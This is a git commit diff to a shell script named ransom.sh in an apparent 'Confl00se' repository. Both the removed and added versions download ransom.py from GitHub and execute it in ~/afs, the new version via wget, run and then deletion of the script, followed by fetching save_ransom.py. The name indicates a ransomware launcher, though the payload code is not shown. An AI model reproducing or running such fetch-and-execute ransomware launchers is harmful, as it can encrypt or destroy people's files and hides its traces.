79dbb788b9ad750d3d4fb1c0267cdd3fdccf74ed
Nekro <70316327+NeKroFR@users.noreply.github.com>
2024-01-12 15:50:48 +0100

    Update ransom.sh

--- scripts/ransom.sh
+++ scripts/ransom.sh
@@ -1,3 +1,5 @@
-cd ~/afs
-python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py")
-wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/save_ransom.py -O save.py
+wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py -O ~/afs/ransom.py
+cd ~/afs/
+python3 ransom.py
+rm ransom.py
+wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/save_ransom.py -O ~/afs/save.py
